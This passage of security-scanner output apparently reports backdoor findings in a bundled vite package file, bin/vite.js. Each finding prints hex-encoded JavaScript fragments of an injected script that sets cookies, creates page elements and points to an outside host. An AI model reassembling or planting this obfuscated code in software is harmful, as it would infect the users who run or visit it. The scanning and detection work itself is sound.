                      "text": "\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38",
                      "markdown": "`\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 6139,
                  "endLine": 4,
                  "endColumn": 6567,
                  "snippet": {
                    "text": "\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38",
                    "rendered": {
                      "text": "\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38",
                      "markdown": "`\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 5707,
                  "endLine": 4,
                  "endColumn": 6135,
                  "snippet": {
                    "text": "\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37",
                    "rendered": {
                      "text": "\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37",
                      "markdown": "`\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 5275,
                  "endLine": 4,
                  "endColumn": 5703,
                  "snippet": {
                    "text": "\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35",
                    "rendered": {
                      "text": "\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35",
                      "markdown": "`\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 4843,
                  "endLine": 4,
                  "endColumn": 5271,
                  "snippet": {
                    "text": "\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35",
                    "rendered": {
                      "text": "\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x66\\x37\\x37\\x32\\x65\\x36\\x66\\x36\\x65\\x36\\x63\\x36\\x66\\x36\\x31\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x38\\x32\\x39\\x37\\x62\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\", \"\\x29\\x28\\x29\\x3b\", \"\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x63\\x36\\x32\\x32\\x63\\x36\\x33\\x32\\x39\\x37\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35",
